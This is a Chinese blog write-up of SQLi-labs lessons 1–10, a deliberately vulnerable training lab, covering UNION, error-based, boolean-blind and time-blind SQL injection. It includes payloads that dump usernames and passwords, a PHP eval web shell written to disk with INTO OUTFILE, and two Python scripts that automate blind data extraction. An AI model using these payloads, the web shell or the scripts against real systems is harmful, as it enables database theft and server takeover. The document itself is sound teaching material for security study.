---
title: 重启，SQLi-labs GET
date: 2020-10-14 21:24:02
categories: CTF做题记录
---

本lab旨在培养注入思维，提供注入思路，lab不要求找flag，别为了做题而做题！有些东西能自己动手的就自己动手试试，我重写lab的原因之一就是没有动手实践\
搭建环境较多，可以自行百度，本lab目的是查其他表或者库里面的内容\
[第一次的lab之旅](https://yq1ng.github.io/z_post/SQLi-Labs%20%E4%BF%AE%E7%82%BC%E6%89%8B%E5%86%8C%20%EF%BC%88Less-1-10%EF%BC%89/)随便看看，只顾抄blog了
<!-- TOC -->

- [Less-1 GET-基于错误的-单引号-字符型注入](#less-1-get-基于错误的-单引号-字符型注入)
- [Less-2 GET-基于错误的-数字型](#less-2-get-基于错误的-数字型)
- [Less-3 GET-基于错误的-单引号变形的字符型注入](#less-3-get-基于错误的-单引号变形的字符型注入)
- [Less-4 GET-基于错误的-双引号字符型注入](#less-4-get-基于错误的-双引号字符型注入)
- [前四题小结](#前四题小结)
- [Less-5 GET-双注入-单引号字符型注入](#less-5-get-双注入-单引号字符型注入)
- [LESS-6 GET-双注入-双引号字符型注入](#less-6-get-双注入-双引号字符型注入)
- [LESS-7 GET-导出文件-字符型注入](#less-7-get-导出文件-字符型注入)
- [LESS-8 GET-布尔盲注-单引号字符型注入](#less-8-get-布尔盲注-单引号字符型注入)
- [LESS-9 GET-基于时间的盲注-单引号字符型注入](#less-9-get-基于时间的盲注-单引号字符型注入)
- [LESS-10 GET-基于时间的盲注-双引号字符型注入](#less-10-get-基于时间的盲注-双引号字符型注入)
- [总结](#总结)

<!-- /TOC -->
<!--more-->

# Less-1 GET-基于错误的-单引号-字符型注入
进门提示输入id参数\
![start](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.qh4fn20disr.png)\
输入`?id=1`回显给了账号密码，id较多，没必要一个一个试，先看源码，翻一下sql语句
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);//关闭所有PHP错误报告
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
脚本第一行导入了连接数据库的配置文件，抑制了错误回显，GET方法接受id参数，并将每次参数值存入result.txt文件中，之后开始sql查询，注意最后`id='$id'`为单引号闭合(一般数值类型的不去用单双引号包括，此处为lab需要)（sql语句不懂的建议先去学习一下MySQL的基础，只是基础就好）。那么如果我去手动闭合会怎么样，比如输入一个`?id=1'`，这在sql语句中就变成了`SELECT * FROM users WHERE id='1'' LIMIT 0,1`，出现了MySQL的报错，在MySQL里测试会让闭合后面的单引号才能继续执行，闭合后也就相当于`SELECT * FROM users WHERE id='1'' LIMIT 0,1;';`，后面引号的内容被丢掉了，没效果。\
![less1_error](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.69fl2g4cmy4.png)\
![less1_test](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.hn1lqmnbc5a.png)
>
- 在此解释一下输入`select 1,2,3;`MySQL干了什么\
它什么也没干，就是原样输出数组，这时它是个1行n列的表，表的属性名和值都是我们输入的数组，详细介绍可以看[这篇blog](https://blog.csdn.net/weixin_44840696/article/details/89166154)

- MySQL的几个引号\
单双引号不必多嘴，就是括住字符串的\
反引号（esc下面那个键），它是为了区分MYSQL的保留字与普通字符而引入的符号。举个栗子：``SELECT `select` FROM `test` WHERE select='字段值'``。
在test表中，有个select字段，如果不用反引号，MYSQL将把select视为保留字而导致出错，所以，有MYSQL保留字作为字段的，必须加上反引号来区分。

- MySql的几个注释
  - `-- ` 单行注释，常用来注入时屏蔽查询后面的字符串，常在最后加上一个字符，因为减号后面有空格，浏览器会自动将最后的空格删去
  - `#` 单行注释，常用于post注入时的屏蔽，get时用无效，因为浏览器解析url时会将`#`当成锚点不予传输给服务器
  - `/**/` 多行注释，常用于绕过空格的过滤，即用`/**/`代替空格

那我们要怎么查询其他表的内容呢？我们知道，查内容需要知道表名、列名，才可以select，在MySQL5.5以上的版本引入了information_schema库，information_schema这个数据库中保存了MySQL服务器所有数据库的信息，我们一般用其中的`tables`来获取当前数据库的所有表名。还不明白？动手实践一下。`TABLE_SCHEMA`代表数据库，`TABLE_NAME`代表数据库中的表\
![information_schema.tables](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.iaob8fwvw2.png)\
使用`select TABLE_SCHEMA, TABLE_NAME from information_schema.tables;`可以查询所有数据库及表，自己实践一下。在注入时常用`select table_name from information_schema.tables where table_schema=database();`\
![information_schema.tables](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.b7af64mw44.png)\
此时将此语句带入到url里，例如这样`?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database()--+`\
![Less1_huixian](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.dzfbttb9194.png)
>
- 什么是union\
MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。--[菜鸟教程](https://www.runoob.com/mysql/mysql-union-operation.html)

- id的值为何是-1\
不让id为1的原因就是想让前面的select查询为空，不然union链接的后面select会被前面吃掉，看一下第一关的源码可以知道，查询数据后只进行了一次取数据，而前面不置空的话会出现两条数据导致第二条我们要的数据显示不出来\
![Less1_id](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.mrykeg0t73.png)

可以发现，我们在MySQL查询的表不止一张，为什么回显就给了第一个表呢？这也是因为查询数据后只进行了一次取数据，也就只会取出第一张表的记录，这时候可以用`group_concat()`函数，此函数就是做连接字符串使用的，如果查询数据有多条，可以使用这个函数将其归为一条数据。也可以用`concat()`来连接，不过`group_concat()`会连接所有非 NULL 的字符串\
![Less1_group_concat()](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.recqr7vg5vd.png)\
所以可以将payload改为:`?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`\
![Less1_payload](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.yczpw3jwgj7.png)\
ok，你大概也知道了怎么用注入的方法去查当前数据库里的所有表名，回头再看一下注入语句，为何使用了`select 1,xx,3 from xx where xx`？为什么不能直接`select xx from xx where xx`？这牵涉到回显的问题，在输入不同的id值时返回不同的数据，这个数据所在的地方就是回显，这个数据也不是随意输入的，需要先找这个表有多少列，然后再判断回显，如果union列数不同会怎样？会失败喽\
![Less1_diff_columns](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.eqke29fimo.png)\
联合查询前先判断列数，判断列数用`order by`去手工查，一般也就5个左右，懒的话就丢到bp里爆破一下，例如本题，在`?id=1' order by 4--+`回显异常，之前都正常回显，这说明数据库列数就是3。
>order by 从英文里理解就是行的排序方式，默认的为升序。 order by 后面必须列出排序的字段名，可以是多个字段名。

![Less1_order_by](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.yn4wg3lsner.png)\
再来想想，为何`order by`排序用的，为什么通过后面的数字就可以知道有多少列呢？因为`order by`后面不仅可以跟字段名，也可以跟数字，代表第几个字段名，动手实践一下，可以看到使用`select * from users order by 2;`时，排序以第二列进行升序，为3时，依照第三列升序，可以自行测试，太长了，懒得放截图，一定要动手啊亲\
![Less1_order_by_num](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.s6py4ijqqr.png)\
列的数量确定了，接下来就是看回显在哪，上面已经说了回显的意思，不再赘述，直接用联合查询`?id=-1' union select 1,2,3--+`，可以看到回显是2和3，所以在爆库的时候就在第二或者第三个上面去改\
![huixian](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.png)\
爆库：`?id=-1' union select 1,database(),version()--+`\
![Less1_database](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.j8fcqkrd5dj.png)\
爆表：`?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`\
![Less1_tables](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.naxk0oinwui.png)\
爆列(以users表为例)：`?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users"--+`\
![Less1_columns](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.gp2te73hebe.png)\
爆字段：`?id=-1' union select 1,group_concat(username,":",password),3 from users--+`\
![Less1_words](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.1yx3e8qzouw.png)\
至此，Less1算是过关

---
# Less-2 GET-基于错误的-数字型
看源码，大体相同，这里只分析sql语句

```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

可以发现，这次的语句和上一题的只差了个引号，贴出来上一题的看看

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

这种变量不被引号括住的叫数字型，故其注入为数字型注入。\

>怎么判断我们注入的是字符型还是数字型？只需在最后加上单引号或者双引号，如果报错就是字符型，否者为数字型，这只是初步判断，一般的常见网站就是这两种，但是本lab包含较全，不可这样简单判断\
![字符型注入](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.2kzseve8yvv.png)\
![数字型注入](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.i7tqg5vigcr.png)

本题payload和上题只差一个单引号
爆表：`?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`\
其他自行测试,别想当然哦

---
# Less-3 GET-基于错误的-单引号变形的字符型注入
本题sql语句

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

和第一题查了个括号，想一想怎么做？\
payload：`?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`

---
# Less-4 GET-基于错误的-双引号字符型注入
注意本题sql语句之前出现id在此赋值

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

拼起来也就是

```php
$sql="SELECT * FROM users WHERE id=("$id") LIMIT 0,1";
```

payload：`?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`

---
# 前四题小结
前四题就是了解一下基本的sql注入及其变形，其实无非就是对于get到的id的操作，进行了引号、括号之类的操作，常规来说就是单引号和数字型。\
总结一下判断注入的思路：

1. 找注入点，经常变化的数据输入处，如id=num

2. 判断闭合，输入单引号看是否报错，例如输入单引号报错如下，在1)处发生错误，这时候就需要在payload后面在加上个`)`来闭合原先的语句，这就是黑盒情况下的测试\
   !['_error](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.11p992dd8uya.png)

3. 使用`order by num`来判断表里的列数，用来找回显

4. 确定会回显后使用payload进行数据库操作

接下来的题目和之前差不多，只是对回显的判断不同，继续淦吗？来\
# Less-5 GET-双注入-单引号字符型注入
先来看看第五题源码
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";
	echo '<font color= "#0000ff" font size= 3>';
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
sql语句和第一题一样，但是回显却变成了固定的，也就是不能直接去获取表名列名了，这就要其他的注入姿势了，但是判断闭合和列数还是和原来一样，不在赘述，忘了的说明没理解和做题较少，慢慢来\
这个题虽然题目说考察双注入，但是第一眼会搞成盲注，这个方法后面的题会说，再次不介绍，有兴趣的可以翻翻以前的lab题解，写的有，也可以等看完后面的再来试试用盲注做这个题\
先介绍什么是双注入，双注入叫双查询注入，顾名思义就是查询里面在嵌套一个查询，MySQL执行时由内到外执行，本次查询先查询了当前使用数据库的名称，然后用concat进行拼接\
![double_select](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.t58eg27wnbi.png)\
想学会双注入，需要先知道这三个函数

- `rand()` 随机函数\
  ![Less5_rand()](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.1sk1kwncwaqh.png)
- `floor()` 向下取整函数\
  ![Less5_floor()](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.3x4z53hw8l7.png)
- `count()` 汇总函数(总所周知程序员计数都是从0开始)\
  ![Less5_count](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.h5yu2jotcxe.png)
- `group by clause` 分组语句，合并分组的重复项，只显示第一条值，可**自行测试**了解的更为深刻\
  ![Less5_group_by](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.fk93i85ncav.png)

现在，如果把floor和rand一起使用会发生什么？出现的值还是随机的吗？理论上是随机的，rand(0)的话会一直取整为0，所以将其*2。可以清楚的看到，随机数并不随机了，前几位总是01101\
![floor_rand(0)*2](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.4lpobawie94.png)\
如果将查询的东西和他连接，例如这样`select concat((select database()),floor(rand(0)*2)) from users;`，最后不是加上1就是加上0，如下，但是这数据是不是有些多？还记得前面的分组语句吗，加上他在看，其中的as是取别名\
![database()0|1](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.p40rc9b6vh.png)
![database()_group_by](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.cotpj19shtr.png)\
然后再加上一个聚合函数，例如`select count(*), concat((select database()), floor(rand()*2))as a from users group by a;`，正常情况下会报错且爆出数据库的名字，如`ERROR 1062 (23000): Duplicate entry 'security1' for key ‘group_key’`，但是我本地复现失败了，可能MySQL版本不同，到此，双注入就算是结束了，按这个套路去查表查列就好\
![fail](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.7icxqrsjjtc.png)\
可以参考[这篇博客](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/)，感觉讲的不错
下面就说说固定用法就好了，group by放后面一样的效果\

- 爆库：`select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2))`
- 爆表：`select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='database_name' limit %d,1),0x3a,floor(rand(0)*2))--+`
- 爆列：`select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='table_name' limit %d,1),0x3a,floor(rand(0)*2))--+`
- 爆值：`elect count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2))--+`

# LESS-6 GET-双注入-双引号字符型注入
和上题相同，只是把单引号转为双引号，不再赘述

# LESS-7 GET-导出文件-字符型注入
先看源码：
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
注意这个id啊，他又变了。。。实际测试时可以试着加点括号，或者整一个简单的fuzz让bp去跑。这次也是没回显，但是提示导出文件，MySQL的导出文件可以将查询的结果导出到某一文件中，我们可以利用这个漏洞将小马导入到服务器中，如`select "<?php @eval($_POST['pass']);?>" into outfile "xxx\\x.php"`，但是这里的路径我们要使用绝对路径，常用的绝对路径可以参考[这篇博客](https://blog.csdn.net/hardhard123/article/details/80062733)，当然我们也可以用下面两个“函数”爆出数据库路径

>@@datadir 查看数据库路径\
@@basedir 查看MySQL安装路径

不过本题过滤了错误，并不会直接输出路径，所以我们可以借助前几题来看\
拿第一关举个例子：`?id=-1' union select 1,@@datadir,@@basedir --+`\
![dir](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.tis3itb85sg.png)\
闭合，字段数应该已经会了，上马`?id=-1')) union select 1,'<?php @eval($_POST["yq1ng"]);?>',3 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php'--+`，注意看payload，因为`\`会被转义，所以用了`\\`来代替，而且文件不能覆盖，也就是说你本次马写错了，下次再传就需要更改文件名，不能和以前的相同，可以自行测试\
上传虽然报错，但是上传成功了，AntSword连接
![success](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.hwtxfy9b02b.png)
**上传不成功看这**\
如果上传失败的话，可能是MySQL没有配置好，我就因为这个费点时间，打开MySQL配置`my.ini`，将`secure_file_priv`置空，如果没有，自行添加 `secure_file_priv = `,这样就可以让文件上传到任何位置，等号后添加路径的话，文件只能上传到此目录下！

# LESS-8 GET-布尔盲注-单引号字符型注入
贴源码看看
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
回显只有正确与否，例如URL加上`?id=1`显示`You are in`，id为-1则无回显，可以通过这个逐个字符判断我们需要的东西，例如`?id=1' and(ascii(substr((select database()),1,1)))=115--+`判断数据库第一个字符是否为s，当然，可以不用ascii，开心就好，接下来说一下各个函数的意义

- `ascii()` 将字符转为ascii码\
![ascii('s')](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.tfyyav4sg2.png)
- `substr(a,b,c)` 字符串截取函数\
a是要截取的字符串，b是截取字符串的起始位置，c是你想要截取字符串的位数 c根据数据库长度写，也可以写大一些，直接跑完2333

不过，盲注一般是先猜测数据库的长度在判断数据库名字，长度判断一般用`length()`，在某些waf下可能需要`and()`的替代函数`if()`，回显限制长度情况下需要`left()`or`right()`

- `length()` 顾名思义，输出字符串长度，自行尝试
- `if(a,b,c)` 类似三目运算，`a?b:c`
  - a为表达式判断，如`ascii(substr(select xxx,1,1))>ascii`
  - b，c为1，0

- `left(str,len)` 对字符串str左截取len长度
- `right(str,len)` 对字符串str右截取len长度
- 测试结果：\
![result](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.ufmaxbjp0e.png)
直接上脚本了，应该可以看懂（最后直接用users表做测试了，到时候可以改，列以id为列），嫌慢的话可以用二分法判断所有字符，我一开始写的枚举，到最后才想起来为啥不用二分法，不想改了

```python
import requests

url = 'http://localhost/sqli-labs/Less-8/?id=1\' '
db_length = 0
db_name = ''
tb_num = 0
tb_length = 0
tb_name = ''
tb_list = []
column_num = 0
column_length = 0
column_name = ''
column_list = []

#db_length
print("Judging the length of the database name...")
for x in range(1,50):
	payload = 'and(if(length(database())=%d,1,0))--+'% x
	#print(payload)
	r = requests.get(url + payload)
	print("\r[+]The database name length is %d"% x,end = '')
	if "You" in r.text:
		db_length = x
		break

#db_name
print("\nGetting the database name...")
for x in range(1,db_length+2):
	for y in range(65,123):
		payload = "and(if(ascii(substr((select database()),%d,1))=%d,1,0))--+"% (x,y)
		#print(url + payload)
		r = requests.get(url + payload)
		print("\r[+]The database name is %s"% db_name,end = '')
		if "You" in r.text:
			db_name += chr(y)
			break

#table_num
print("\nJudging the number of tables in the database...")
for x in range(1,100):
	#payload = "and if(((select count(*) from information_schema.tables where table_schema='%s')=%d),1,0)--+"% (db_name,x)
	payload = "and if(((select count(*) from information_schema.tables where table_schema=database())=%d),1,0)--+"% x
	#print(payload)
	r = requests.get(url+payload)
	print("\r[+]There are %d tables in this database"% x,end = '')
	if "You" in r.text:
		tb_num = x
		break

#table_name
print("\nGetting the table name...")
for x in range(0,tb_num):
	tb_name = ''
	#table_length
	for y in range(1,21):
		payload = "and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"% (x,y)
		r = requests.get(url + payload)
		#print(url + payload)
		if "You" in r.text:
			tb_length = y
			#print(tb_length)
			#table_name
			for z in range(1,tb_length+1):
				for i in range(65,123):
					payload = "and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+"% (x,z,i)
					r = requests.get(url + payload)
					#print(url + payload)
					if "You" in r.text:
						tb_name += chr(i)
						break
			print("[+]" + tb_name)
			tb_list.append(tb_name)
			break
print("The table names in this database are：",tb_list)

#column_num
print("\nJudging the number of columns in the table...")
for x in tb_list:
	#column_num
	for y in range(1,51):
		payload = "and (select count(column_name) from information_schema.columns where table_name='%s')=%d--+"% (x,y)
		r = requests.get(url + payload)
		#print(url + payload)
		if "You" in r.text:
			column_num = y
			print(("[+] table %-8s\t" % x) + 'of   ' + str(column_num) + '   columns')
			break

#column_name
print('column names in the %s table：' % tb_list[-1])
for x in range(1,13):
	column_name = ''
	for y in range(1,25):
		payload = "and (select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)=%d--+"% (tb_list[-1],x,y)
		r = requests.get(url + payload)
		if "You" in r.text:
			column_length = y
			#column_name
			for z in range(1,column_length + 1):
				for i in range(65,123):
					payload = "and ascii(substr((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+"% (tb_list[-1],x,z,i)
					r = requests.get(url + payload)
					if "You" in r.text:
						column_name += chr(i)
						break
			print("[+]"+column_name)
			column_list.append(column_name)
			break
print("columns is ：",column_list)

#field_num
for x in range(1,999):#不知道有多少条字段，尽量大
	payload = 'and if((select count(*) from %s)=%d,1,0)--+'% (tb_list[-1], x)
	#print(payload)
	r = requests.get(url + payload)
	if "You" in r.text:
		field_num = x
		break
print("There are %d values ​​in the %s table"% (field_num, tb_list[-1]))


#field_value
print("The value of %s is"% column_list[-1])
for x in range(0, field_num):
	field_value = ''
	for y in range(1, 999):
		for z in range(33,128):
			payload = 'and ascii(substr((select %s from %s limit %d,1),%d,1))=%d--+'% (column_list[-1], tb_list[-1], x ,y ,z)
			#print(payload)
			r = requests.get(url + payload)
			if "You" in r.text:
				field_value += chr(z)
				break
		if z == 127:
			break
	print("[+]" + field_value)
```
![result](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.ymq5gxadjp.png)
![result](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.br95ep6ig1u.png)
盲注脚本一条龙服务哈哈哈

# LESS-9 GET-基于时间的盲注-单引号字符型注入
贴出来源码：
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
这个和第八题唯一不同的就是第八题的32行被注释了第九题的为被注释，这就导致本题输入的正确与否会先都一样，这就需要`sleep()`登场了，函数就如名字一样，常与`if()`搭配，先来试试`sleep`看看情况如何，页面延迟了3S后才刷新\
![sleep](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.pexm56xracq.png)
和上一题大同小异，只是payload和if判断变了，用我以前写的脚本吧

```python
import requests

url = "http://localhost/sqli-labs/Less-9/?id=1' "
db_length = 0
db_name = ''
tb_num = 0
tb_length = 0
tb_name = ''
tb_list = []
column_num = 0
column_length = 0
column_name = ''
column_list = []

###   数据库长度与名称   ###
print("正在判断数据库名称长度...")
for i in range(1,20):
	db_pyload = "and(if((length(database())=%d),sleep(3),0))--+"% i
	r = requests.get(url+db_pyload)
	time = r.elapsed.total_seconds()
	#print(time)获取响应时间
	print("\r数据库名称长度为：%d"% i, end = '')
	if time > 3:
		db_length = i
		print("\n-----------------------------------------")
		break

print("正在获取数据库名称...")
for i in range(1,db_length+1):
	for j in range(65,123):
		db_pyload = "and(if(ascii(substr((select database()),%d,1))=%d,sleep(3),0))--+"% (i,j)
		r = requests.get(url+db_pyload)
		time = r.elapsed.total_seconds()
		if time > 3:
			db_name += chr(j)
			print('\r'+db_name,end = '')
			break
print("\n-----------------------------------------")

###   数据库表个数与名称   ###
print("正在判断数据库中表的个数...")
for i in range(1,100):
	tb_pyload = "and if(((select count(*) from information_schema.tables where table_schema='%s')=%d),sleep(3),0)--+"% (db_name,i)
	r = requests.get(url+tb_pyload)
	time = r.elapsed.total_seconds()
	if time > 3:
		tb_num = i
		print("此数据库中共有%d个表"% tb_num)
		print("-----------------------------------------")
		break
print("正在获取表名...")
###每张表的表长及表名###
for i in range(0,tb_num):
	tb_name = ''
	###表名长度###
	for j in range(1,21):
		tb_pyload = "and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"% (i,j)
		r = requests.get(url+tb_pyload)
		#print(url+tb_pyload)
		if "You are in" in r.text:
			tb_length = j
			#print(tb_length)
			###表名###
			for k in range(1,tb_length+1):
				for l in range(65,123):
					tb_pyload = "and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+"% (i,k,l)
					r = requests.get(url+tb_pyload)
					#print(url+tb_pyload)
					if "You are in" in r.text:
						tb_name += chr(l)
						break
			print("[+]"+tb_name)
			tb_list.append(tb_name)
			break
print("表名：",tb_list)
###   表的列个数与名称   ###
for i in tb_list:
	###列的个数###
	for j in range(1,51):
		column_pyload = "and (select count(column_name) from information_schema.columns where table_name='%s')=%d--+"% (i,j)
		r = requests.get(url+column_pyload)
		#print(url+column_pyload)
		if "You are in" in r.text:
			column_num = j
			print(("[+] 表名：%-10s\t" % i) + '共' + str(column_num) + '列')
			break
###列长度，例子:ures###
print('%s表中的列名：' % tb_list[-1])
for i in range(3,6):
	column_name = ''
	for j in range(1,25):
		column_pyload = "and (select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)=%d--+"% (tb_list[-1],i,j)
		r = requests.get(url+column_pyload)
		if "You are in" in r.text:
			column_length = j
			###列名###
			for k in range(1,column_length+1):
				for l in range(65,123):
					column_pyload = "and ascii(substr((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+"% (tb_list[-1],i,k,l)
					r = requests.get(url+column_pyload)
					if "You are in" in r.text:
						column_name += chr(l)
						break
			print("[+]"+column_name)
			column_list.append(column_name)
			break
print("列名：",column_list)
```

---
# LESS-10 GET-基于时间的盲注-双引号字符型注入
脚本只需要将上题的url最后的单引号改为双引号就好

---
# 总结
通过本lab的10道get注入基本的sql注入想必你已经会了，其他的骚姿势在题中学习吧\
总结一下sql注入的步骤：

1. 寻找注入点，看看url里面有无`id=xxx`之类的,注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地方
2. 找到可疑的地方后进行判断，是数字型还是字符型，可以再去看看Less2的思维导图~~字符型可以先从单引号入手再逐个增加括号~~
3. 判断出类型后进行字段数的判断，用`order by num`
4. 以3个字段数来说，再用`union select 1,2,3`找出回显位置
5. 在回显处进行查询信息

以后还会有cookie注入、session注入、post注入、宽字节注入等等，慢慢来，第一部分lab到此完结，撒花*★,°*:.☆(￣▽￣)/$:*.°★* 。